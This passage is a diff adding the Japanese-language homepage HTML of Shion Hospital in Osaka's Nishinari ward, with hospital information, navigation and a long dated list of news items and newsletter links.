@@ -1,0 +1,880 @@
+﻿<!DOCTYPE html>
+<html dir="ltr" lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=yes, maximum-scale=1.0, minimum-scale=1.0">
+<title>医療法人嘉健会 思温病院</title>
+<meta name="description" content="大阪市西成区にある医療法人嘉健会 思温病院のホームページです。開放型病院として地域の先生方と連携し、より質の高い医療を実現します。また、急性期から亜急性期、回復期、長期療養まで様々な病態に対応するとともに、退院後も在宅療養支援病院として患者さまをサポートいたします。。大阪市営地下鉄四つ橋線花園町駅徒歩3分　堺筋線天下茶屋駅徒歩10分" />
+<meta name="Keywords" content="２次救急指定病院,医療法人嘉健会,大阪市,西成区,病院,内科,外科,整形外科,総合診療科,泌尿器科,思温病院" />
+<link rel="stylesheet" href="style.css" type="text/css" media="screen">
+<link rel="stylesheet" href="swiper.min.css" type="text/css" media="screen">
+<link rel="shortcut icon" href="images/favicon.ico">
+<!--[if lt IE 10]><!-->
+<script src="js/html5.js"></script>
+<script src="js/css3-mediaqueries.js"></script>
+<!--<![endif]-->
+<script src="js/jquery1.7.2.min.js"></script>
+<script src="js/script.js"></script>
+<script src="js/top.js"></script>
+<script type="text/javascript" src="js/readmore.js"></script>
+
+
+
+<link rel="canonical" href="http://www.shion-hp.or.jp" />
+<meta property="og:locale" content="ja_JP" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="医療法人嘉健会 思温病院 | 地域医療を支えるトータルケア病院" />
+<meta property="og:description" content="大阪市西成区にある医療法人嘉健会 思温病院のホームページです。私たちは思温病院ならではのホスピタリティで、患者さまとそのご家族に対話ある医療・看護・介護を提供する共に、地域の方々に信頼される病院を目指していきます。大阪市営地下鉄四つ橋線花園町駅徒歩3分　堺筋線天下茶屋駅徒歩10分" />
+<meta property="og:url" content="http://www.shion-hp.or.jp" />
+<meta property="og:site_name" content="医療法人嘉健会 思温病院" />
+<meta property="og:image" content="images/cover.png" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:description" content="大阪市西成区にある医療法人嘉健会 思温病院のホームページです。私たちは思温病院ならではのホスピタリティで、患者さまとそのご家族に対話ある医療・看護・介護を提供する共に、地域の方々に信頼される病院を目指していきます。大阪市営地下鉄四つ橋線花園町駅徒歩3分　堺筋線天下茶屋駅徒歩10分" />
+<meta name="twitter:title" content="医療法人嘉健会 思温病院 | 地域医療を支えるトータルケア病院" />
+<meta name="twitter:image" content="images/cover.png" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110508526-10"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-110508526-10'
+,{
+‘linker’: {
+‘domains’: [‘shion-hp.or.jp’, ‘shion-hp-nurse.jp’] }
+}
+
+
+  );
+</script>
+
+</head>
+
+  <script>
+  jQuery(function($){
+      $('#read_text').readmore({
+        speed: 750,
+        collapsedHeight: 0,
+        moreLink: '<a href="#" class="btn">続きを表示する</a>',
+        lessLink: '<a href="#" class="btn_close">閉じる</a>'
+      });
+    });
+  </script>
+  <style>
+  #read_text{
+    overflow-y:hidden; 
+  }
+  </style>        
+    
+    
+<body>
+<header id="header">
+  <!-- ロゴ -->
+	<div class="logo">
+	  <a href="index.html"><img src="images/logo.jpg" alt="医療法人嘉健会 思温病院ロゴ" style="width: 100%;"/><br /></a>
+	</div>
+	<!-- / ロゴ -->
+	<!-- 電話番号+受付時間 -->
+
+  <div class="info">
+		<p class="tel"><span>電話:</span> 06-6657-3711</p>
+		<p class="open">&#12306;557-0034<br>
+大阪市西成区松1丁目1番31号</p>
+<p class="open" id="slow"><a href="about.html#access">交通アクセスはこちら</a></p>
+	</div>
+	<!-- / 電話番号+受付時間 -->
+</header>
+
+<!-- メインナビゲーション -->
+<nav id="mainNav">
+  <div class="inner">
+    <a class="menu" id="menu"><span>MENU</span></a>
+    <div class="panel">
+      <ul>
+      <li class="active"><a href="index.html"><strong>トップページ</strong></a></li>
+      <li><a href="about.html"><strong>病院のご案内</strong></a></li>
+      <li><a href="./images/pamphlet.pdf" target="_blank"><strong>病院<br>パンフレット</strong></a></li>
+      <li><a href="hospitalpolicy.html"><strong>病院の方針</strong></a></li>
+      <li><a href="schedule.html"><strong>外来診療担当表</strong></a></li>
+      <li><a href="consultation.html"><strong>医師のご紹介</strong></a></li>
+      <li><a href="department.html"><strong>部門のご紹介</strong></a></li>
+      <li><a href="hospitalization.html"><strong>診察・入院の<br>ご案内</strong></a></li>
+      <li><a href="shiondayori.html"><strong>しおんだより</strong></a></li>
+      <li><a href="recruit.html"><strong>求人情報</strong></a></li>
+      <li><a href="./images/notices.pdf" target="_blank"><strong>厚生労働大臣の<br>定める掲示事項</strong></a></li>
+      </ul>
+    </div>
+	</div>
+</nav>
+<!-- / メインナビゲーション -->
+
+<div id="wrapper">
+
+<!-- メイン画像 -->
+	<div id="mainBanner">
+
+		<div class="swiper-container">
+		<div class="swiper-wrapper">
+			<div class="swiper-slide">
+				<h1><img src="images/main2.jpg" alt="" ></h1>
+			</div>
+			<div class="swiper-slide">
+				<h1><img src="images/main12.jpg" alt="" ></h1>
+			</div>
+			<div class="swiper-slide">
+				<h1><img src="images/main14.jpg" alt="" ></h1>
+			</div>
+			<div class="swiper-slide">
+				<h1><img src="images/main11.jpg" alt="" ></h1>
+			</div>
+			
+		</div>
+
+		</div>
+		<!-- Swiper JS -->
+    <script src="js/swiper.min.js"></script>
+
+    <!-- Initialize Swiper -->
+    <script>
+    var swiper = new Swiper('.swiper-container', {
+		speed:1000,
+        spaceBetween: 30,
+        centeredSlides: true,
+        autoplay: 3000,
+        autoplayDisableOnInteraction: false,
+		effect: 'fade',
+		loop: true,
+		simulateTouch: false
+    });
+    </script>
+
+	</div>
+<!-- / メイン画像 -->
+
+<!-- コンテンツ -->
+  <p class="sub_title_main" style="text-align: center;">
+    「これからの高齢者医療に最適なソリューションを提供する」<br><img class="pamphlet_img" src="images/pamphlet_img.png" width="60%">
+  </p>
+  
+  <div id="paragraph">
+    <h2 class="idea">地域医療を支えるトータルケア病院</h2>
+     <p class="copy">開放型病院として地域の先生方と連携し、より質の高い医療を実現します。<br />また、急性期から亜急性期、回復期、長期療養まで様々な病態に対応するとともに、<br />退院後も在宅療養支援病院として患者さまをサポートいたします。</p>
+  </div>
+
+  <div id="sub_copy">
+    <div class="clearfix">
+      <div class="left" style="margin-bottom: 30px;">
+        <p class="sub_title_main">人情・温情に厚く、<br />安全で利便性も高い立地です。</p>
+        <p class="p_m_sub">
+            思温病院は四ツ橋筋（国道26号線）に面した街中の立地であり、旧家街に位置しており人情・温情に厚い土地柄です。また、地下鉄四ツ橋線花園町駅下車３分と公共交通利用時のフットワークも良好です。<br /><br />
+            常勤医を中心に質の高いチーム医療を推進するとともに、病棟を急性期一般病棟60床・地域包括ケア病棟60床・療養病棟60床に再編し療養環境の向上に努めております。<br>
+        </p>
+      </div>
+      <div class="right"><img src="images/main_sub.jpg" alt="病院正面玄関"></div>
+      <br><br><br>
+      
+      <div class="left" style="margin-bottom: 30px;">
+        <p class="sub_title_main">2024年度関西経営品質賞「ゴールド」を<br />受賞しました</p>
+        <p class="p_m_sub">
+            関西経営品質賞とは、「“良い経営”を通じて関西から世界に誇る企業・組織を輩出する」ことを使命として創設された賞制度で、顧客価値経営の実践を重視する点が大きな特徴です。<br>
+        </p>
+      </div>
+      <div class="right">
+        <a href="images/info_20250212.pdf" target="_blank"><img src="images/gold.jpg" alt="関西経営品質賞「ゴールド」を受賞"></a>
+      </div>
+      <br><br><br>
+            
+      
+      <div class="left" style="margin-bottom: 20px;">
+        <p class="sub_title_main">理事長 狹間研至のメッセージ</p>
+        <p class="p_m_sub">
+          ホスピタルズ・ファイルに理事長 狭間研至のメッセージが掲載されました。<br>「地域の方々に『思温病院があるから安心安全』と思っていただくこと」を理念に掲げる、理事長 狹間研至のメッセージはこちらのバナーからご覧ください。
+        </p>
+      </div>
+      <div class="right">
+            <a href="https://hospitalsfile.doctorsfile.jp/h/1048155/cm/" target="_blank"><img src="./images/message.jpg"></a>
+      </div>
+      <div class="left" style="margin-bottom: 20px;">
+        <p class="sub_title_main">Instagram を始めました</p>
+        <p class="p_m_sub">思温病院のインスタグラムのアカウントを開設いたしました。<br>ご興味のある方はこちらのバナーからご覧ください。</p>
+      </div>
+      <div class="right">
+        <a href="https://www.instagram.com/shion.hospital/" target="_blank"><img src="./images/Instagram.jpg"></a>
+      </div>                            
+
+      <br><br><br>
+
+      <p><a href="https://shion-hp-nurse.jp/" target="_blank"><img src="images/nurse_banner.jpg" alt="思温病院看護部採用サイト"></a></p>
+    </div>
+    </div>
+    
+    <!-- インフォ -->
+    <h3 class="heading">お知らせ</h3>
+      <section class="content">
+        <article>
+        <ul class="rssbox">
+          
+          <li>
+          <span class="date">2025.07.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol57.pdf">「しおんだよりVOL.57」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.06.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol56.pdf">「しおんだよりVOL.56」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.05.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol55.pdf">「しおんだよりVOL.55」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.04.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol54.pdf">「しおんだよりVOL.54」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.04.01</span>
+          <span class="info_title">新入職の常勤医師と、退職の常勤医師のお知らせを掲載しました。詳細は<a href="images/info_20250401.pdf">こちらのPDF</a>をご覧ください。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.03.19</span>
+          <span class="info_title">広報誌<a href="images/shion_vol53.pdf">「しおんだよりVOL.53」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.02.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol52.pdf">「しおんだよりVOL.52」</a>を発行しました。</span><br>
+          </li>   
+          
+          <li>
+          <span class="date">2025.02.12</span>
+          <span class="info_title">思温病院が一般財団法人 関西経営品質協議会が主催する「2024年度 関西経営品質賞 ゴールド」を受賞いたしました。詳しくは<a href="images/info_20250212.pdf">こちら</a>をご覧ください。</span><br>
+          </li>                                         
+          
+          <li>
+          <span class="date">2025.01.24</span>
+          <span class="info_title">広報誌<a href="images/shion_vol51.pdf">「しおんだよりVOL.51」</a>を発行しました。</span><br>
+          </li>                     
+          
+          <li>
+          <span class="date">2024.12.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol50.pdf">「しおんだよりVOL.50」</a>を発行しました。</span><br>
+          </li>           
+          
+          <li>
+          <span class="date">2024.12.06</span>
+          <span class="info_title"><span style="color:red;">【年末年始休診のお知らせ】</span><br>12月29日(日)～1月5日(日)の期間を休診とさせていただきます。詳細は<a href="./images/info_20241206.pdf" target="_blank">こちら</a>をご覧ください。</span><br>
+          </li>
+          
+          <li>
+          <span class="date">2024.11.18</span>
+          <span class="info_title">広報誌<a href="images/shion_vol49.pdf">「しおんだよりVOL.49」</a>を発行しました。</span><br>
+          </li> 
+          
+          <li>
+          <span class="date">2024.10.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol48.pdf">「しおんだよりVOL.48」</a>を発行しました。</span><br>
+          </li> 
+          
+          <li>
+          <span class="date">2024.10.08</span>
+          <span class="info_title"><a href="./schedule.html">外来診療担当表</a>を変更しました。</span><br>
+          </li> 
+          
+          
+          <!-- more  -->
+          <div id="read_text" class="btn_close">          
+          
+            
+          <li>
+          <span class="date">2024.09.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol47.pdf">「しおんだよりVOL.47」</a>を発行しました。</span><br>
+          </li> 
+          
+          <li>
+          <span class="date">2024.08.21</span>
+          <span class="info_title">広報誌<a href="images/shion_vol46.pdf">「しおんだよりVOL.46」</a>を発行しました。</span><br>
+          </li>                      
+
+          <li>
+          <span class="date">2024.07.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol45.pdf">「しおんだよりVOL.45」</a>を発行しました。</span><br>
+          </li>            
+
+          
+          <li>
+          <span class="date">2024.06.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol44.pdf">「しおんだよりVOL.44」</a>を発行しました。</span><br>
+          </li>          
+            
+          <li>
+          <span class="date">2024.05.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol43.pdf">「しおんだよりVOL.43」</a>を発行しました。</span><br>
+          </li>
+          
+          <li>
+          <span class="date">2024.05.01</span>
+          <span class="info_title">当院のSNS運用規定を掲載しました。詳細は<a href="./hospitalpolicy.html#sns">こちら</a>をご覧ください。</span><br>
+          </li>
+          
+          <li>
+          <span class="date">2024.04.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol42.pdf">「しおんだよりVOL.42」</a>を発行しました。</span><br>
+          </li>
+          
+          <li>
+          <span class="date">2024.04.01</span>
+          <span class="info_title">4月1日より、面会制限を緩和します。詳細は<a href="images/info_20240401.pdf">こちらのPDF</a>をご覧ください。</span><br>
+          </li>                                
+
+            
+          <li>
+          <span class="date">2024.04.01</span>
+          <span class="info_title"><a href="./schedule.html">外来診療担当表</a>を変更しました。</span><br>
+          </li>          
+          
+          <li>
+          <span class="date">2024.03.22</span>
+          <span class="info_title">新入職の常勤医師と、退職の常勤医師のお知らせを掲載しました。詳細は<a href="images/info_20240322.pdf">こちらのPDF</a>をご覧ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2024.03.19</span>
+          <span class="info_title">広報誌<a href="images/shion_vol41.pdf">「しおんだよりVOL.41」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2024.03.04</span>
+          <span class="info_title">【求人】「医事課」募集のお知らせ<br>
+          思温病院では「医事課」を募集しております。<br>
+          詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2024.02.27</span>
+          <span class="info_title">広報誌<a href="images/shion_vol40.pdf">「しおんだよりVOL.40」</a>を発行しました。</span><br>
+          </li>
+          
+          <li>
+          <span class="date">2024.02.07</span>
+          <span class="info_title"><a href="./schedule.html">外来診療担当表</a>を変更しました。</span><br>
+          </li>                
+
+          <li>
+          <span class="date">2024.01.26</span>
+          <span class="info_title">広報誌<a href="images/shion_vol39.pdf">「しおんだよりVOL.39」</a>を発行しました。</span><br>
+          </li>                      
+
+          <li>
+          <span class="date">2024.01.05</span>
+          <span class="info_title"><a href="./schedule.html">外来診療担当表</a>を変更しました。</span><br>
+          </li>          
+
+          <li>
+          <span class="date">2023.12.26</span>
+          <span class="info_title">面会制限を緩和しました。詳細は<a href="images/info_20231225.pdf">こちらのPDF</a>をご覧ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.12.12</span>
+          <span class="info_title">広報誌<a href="images/shion_vol38.pdf">「しおんだよりVOL.38」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2023.12.05</span>
+          <span class="info_title"><a href="images/shion_heart-team_no6.pdf">「思温病院ハートチーム便りNO.6」</a>を発行しました。</span><br>
+          </li>                    
+
+          <li>
+          <span class="date">2023.11.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol37.pdf">「しおんだよりVOL.37」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2023.10.31</span>
+          <span class="info_title"><a href="images/shion_heart-team_no5.pdf">「思温病院ハートチーム便りNO.5」</a>を発行しました。</span><br>
+          </li>                
+
+          <li>
+          <span class="date">2023.10.25</span>
+          <span class="info_title">広報誌<a href="images/shion_vol36.pdf">「しおんだよりVOL.36」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2023.09.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol35.pdf">「しおんだよりVOL.35」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.08.30</span>
+          <span class="info_title"><a href="./hospitalization.html#card">診察・入院のご案内</a>ページにご利用可能なクレジットカード情報を掲載しました。</span><br>
+          </li>       
+
+          <li>
+          <span class="date">2023.08.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol34.pdf">「しおんだよりVOL.34」</a>を発行しました。</span><br>
+          </li>       
+
+          <li>
+          <span class="date">2023.07.18</span>
+          <span class="info_title">広報誌<a href="images/shion_vol33.pdf">「しおんだよりVOL.33」</a>を発行しました。</span><br>
+          </li>       
+
+          <li>
+          <span class="date">2023.06.29</span>
+          <span class="info_title">広報誌<a href="images/shion_vol32.pdf">「しおんだよりVOL.32」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2023.05.20</span>
+          <span class="info_title">広報誌<a href="images/shion_vol31.pdf">「しおんだよりVOL.31」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.05.01</span>
+          <span class="info_title"><a href="https://hospitalsfile.doctorsfile.jp/h/1048155/cm/" target="_blank">ホスピタルズ・ファイル</a>に理事長 狭間研至のメッセージが掲載されました。下のバナーからご覧いただけます。<br>          <a href="https://hospitalsfile.doctorsfile.jp/h/1048155/cm/" target="_blank"><img src="./images/message.jpg" style="height: 100px; width: 250px;"></a></span>
+          </li>            
+
+          <li>
+          <span class="date">2023.04.30</span>
+          <span class="info_title"><a href="images/shion_heart-team_no4.pdf">「思温病院ハートチーム便りNO.4」</a>を発行しました。</span><br>
+          </li>        
+
+          <li>
+          <span class="date">2023.04.28</span>
+          <span class="info_title"><span style="color:red; font-weight: bold;">【重要】面会再開のお知らせ</span><br><span style="font-weight: bold;">2023年5月8日（月）より、面会禁止を緩和いたします。</span><br>詳しい内容は、<a href="images/info_20230428.pdf">こちらのPDF</a>をご参照ください。</span><br>
+          </li>                        
+
+          <li>
+          <span class="date">2023.04.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol30.pdf">「しおんだよりVOL.30」</a>を発行しました。</span><br>
+          </li>  
+
+          <li>
+          <span class="date">2023.03.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol29.pdf">「しおんだよりVOL.29」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.03.13</span>
+          <span class="info_title">外来診療担当表変更のお知らせ<br>2023年4月より外来診療担当表が変更になります。<br>
+          詳しい内容は<a href="images/outpatient_schedule.pdf">こちら</a>をご参照ください。</span><br>
+          </li>     
+
+          <li>
+          <span class="date">2023.02.22</span>
+          <span class="info_title">広報誌<a href="images/shion_vol28.pdf">「しおんだよりVOL.28」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.01.17</span>
+          <span class="info_title">広報誌<a href="images/shion_vol27.pdf">「しおんだよりVOL.27」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2023.01.16</span>
+          <span class="info_title"><span style="color:red; font-weight: bold;">緊急休診のお知らせ</span><br>整形外科　岡垣医師　急病のため１月16日月曜から20日金曜までの間　整形外科外来は休診とさせていただきます。ご迷惑をお掛けしますが、予めご了承願います。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.12.31</span>
+          <span class="info_title"><a href="images/shion_heart-team_no3.pdf">「思温病院ハートチーム便りNO.3」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.12.19</span>
+          <span class="info_title">広報誌<a href="images/shion_vol25.pdf">「しおんだよりVOL.25」</a>、<a href="images/shion_vol26.pdf">「しおんだよりVOL.26」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2022.11.30</span>
+          <span class="info_title"><a href="images/shion_heart-team_no2.pdf">「思温病院ハートチーム便りNO.2」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.10.24</span>
+          <span class="info_title">心不全パンデミックが指摘される中、当院でも「ハートチーム」を立ち上げ取り組んでいますが、この度、日本移植学会雑誌に、当院松田暉特別顧問の原著論文<a href="images/ishoku_57_02.pdf">「心停止ドナーから見た心臓および肺移植の世界の現状とわが国の課題」</a>が掲載されました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2022.10.20</span>
+          <span class="info_title">広報誌<a href="images/shion_vol24.pdf">「しおんだよりVOL.24」</a>と<a href="images/shion_heart-team_no1.pdf">「思温病院ハートチーム便りNO.1」</a>を発行しました。</span><br>
+          </li>          
+
+          <li>
+          <span class="date">2022.10.14</span>
+          <span class="info_title">広報誌<a href="images/shion_vol23.pdf">「しおんだよりVOL.23」</a>を発行しました。</span><br>
+          </li>           
+
+          <li>
+          <span class="date">2022.08.31</span>
+          <span class="info_title">情報誌<a href="images/osaka_heart_club_vol46.pdf">「MONTHLY BULLETIN OSAKA HEART CLUB VOL.46」</a>に、心不全に対するチーム医療を実践した症例報告が掲載されました。<br>当院での心不全ケアチーム活動の一端を是非ご一読ください。</span><br>
+          </li>          
+
+          <li>
+          <span class="date">2022.08.24</span>
+          <span class="info_title">【求人】「医事課」募集のお知らせ<br>
+          思温病院では「医事課」を募集しております。<br>
+          詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.08.19</span>
+          <span class="info_title">広報誌<a href="images/shion_vol22.pdf">「しおんだよりVOL.22」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.07.21</span>
+          <span class="info_title">広報誌<a href="images/shion_vol21.pdf">「しおんだよりVOL.21」</a>を発行しました。</span><br>
+          </li>                       
+
+          <li>
+          <span class="date">2022.06.29</span>
+          <span class="info_title">広報誌<a href="images/shion_vol19.pdf">「しおんだよりVOL.19」</a>、<a href="images/shion_vol20.pdf">「しおんだよりVOL.20」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2022.04.25</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2022.04.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol18.pdf">「しおんだよりVOL.18」</a>を発行しました。</span><br>
+          </li> 
+            
+          <li>
+          <span class="date">2022.03.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol17.pdf">「しおんだよりVOL.17」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.03.01</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.02.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol16.pdf">「しおんだよりVOL.16」</a>を発行しました。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2022.01.27</span>
+          <span class="info_title">広報誌<a href="images/shion_vol15.pdf">「しおんだよりVOL.15」</a>を発行しました。</span><br>
+          </li>
+          <li>
+          <span class="date">2021.12.16</span>
+          <span class="info_title">広報誌<a href="images/shion_vol14.pdf">「しおんだよりVOL.14」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.11.30</span>
+          <span class="info_title">広報誌<a href="images/shion_vol13.pdf">「しおんだよりVOL.13」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.10.21</span>
+          <span class="info_title">広報誌<a href="images/shion_vol12.pdf">「しおんだよりVOL.12」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.10.18</span>
+          <span class="info_title">【求人】「地域連携室　医療ソーシャルワーカー」、「医事課・交換及び事務補助」（パート）募集のお知らせ<br>思温病院では「地域連携室　医療ソーシャルワーカー」とパートの「医事課・交換及び事務補助」を募集しております。<br>詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>     
+            
+          <li>
+          <span class="date">2021.09.24</span>
+          <span class="info_title">広報誌<a href="images/shion_vol11.pdf">「しおんだよりVOL.11」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.08.19</span>
+          <span class="info_title">広報誌<a href="images/shion_vol10.pdf">「しおんだよりVOL.10」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.07.26</span>
+          <span class="info_title">広報誌<a href="images/shion_vol9.pdf">「しおんだよりVOL.9」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.06.21</span>
+          <span class="info_title">広報誌<a href="images/shion_vol8.pdf">「しおんだよりVOL.8」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.05.21</span>
+          <span class="info_title">広報誌<a href="images/shion_vol7.pdf">「しおんだよりVOL.7」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.05.01</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.04.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol6.pdf">「しおんだよりVOL.6」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2021.04.01</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.03.25</span>
+          <span class="info_title">面会禁止のお願い<br>3月25日から当面の間、再び面会禁止とさせていただきます。ご理解、ご協力の程よろしくお願いいたします。<br><a href="images/20210325.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.03.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol5.pdf">「しおんだよりVOL.5」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.03.02</span>
+          <span class="info_title">予約制での面会を一部再開します。<a href="images/20210302.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.02.26</span>
+          <span class="info_title">広報誌<a href="images/shion_vol4.pdf">「しおんだよりVOL.4」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.02.05</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2021.01.14</span>
+          <span class="info_title">【求人】「 ケアマネージャー（介護支援専門員）」募集のお知らせ<br>思温病院では常勤の「ケアマネージャー（介護支援専門員）」を募集しております。<br> 詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>            
+
+          <li>
+          <span class="date">2021.01.14</span>
+          <span class="info_title">広報誌<a href="images/shion_vol3.pdf">「しおんだよりVOL.3」</a>を発行しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2020.12.24</span>
+          <span class="info_title">整形外科 常勤医 交代のお知らせ<br>
+          <a href="images/20201224.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>	
+
+          <li>
+          <span class="date">2020.12.16</span>
+          <span class="info_title">【求人】「臨床検査技師」パート募集のお知らせ<br>
+          思温病院ではパートの「臨床検査技師」を募集しております。<br>
+          詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2020.12.15</span>
+          <span class="info_title">広報誌<a href="images/shion_vol2.pdf">「しおんだよりVOL.2」</a>を発行しました。</span><br>
+          </li>
+
+          <!--<li>
+          <span class="date">2020.12.09</span>
+          <span class="info_title">思温病院 看護部採用サイトに<a href="https://shion-hp-nurse.jp/matsuda.html" target="_blank">特別顧問 松田 暉 からのメッセージ</a>を公開しました。</span><br>
+          </li>-->
+
+          <li>
+          <span class="date">2020.12.03</span>
+          <span class="info_title">【求人】「臨床検査技師」募集のお知らせ<br>思温病院では「臨床検査技師」を募集しております。<br> 詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.11.11</span>
+          <span class="info_title">広報誌<a href="images/shion_vol1.pdf">「しおんだよりVOL.1」</a>を発行しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.10.09</span>
+          <span class="info_title">【求人】「看護師」「准看護師」パート募集のお知らせ<br> 思温病院ではパートの「看護師」「准看護師」を募集しております。<br>詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.10.07</span>
+          <span class="info_title">外来診療担当表を変更しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.09.30</span>
+          <span class="info_title"><a href="https://shion-hp-nurse.jp/" target="_blank">思温病院 看護部採用サイト</a>を公開しました。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.09.18</span>
+          <span class="info_title">【求人】「医事課」募集のお知らせ<br>思温病院では「医事課」を募集しております。<br>詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.08.20</span>
+          <span class="info_title">面会制限の一部緩和に関するお知らせとお願いをいたします。<a href="images/20200820.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>			
+
+          <li>
+          <span class="date">2020.05.22</span>
+          <span class="info_title">新型コロナウイルス感染症緊急事態宣言解除後の当院対応について。<a href="images/20200522.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>	
+
+          <li>
+          <span class="date">2020.04.01</span>
+          <span class="info_title">電話でのお薬の処方申込みについて(新型コロナウイルス対策)<a href="images/20200415.pdf">詳細はPDF</a>をご確認ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.04.01</span>
+          <span class="info_title">新型コロナウイルス感染防止対策として、	4月6日月曜日より外来リハビリテーションについて、当院では行わないことといたしました。ご迷惑をおかけいたしますが、予めご了承ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2020.03.31</span>
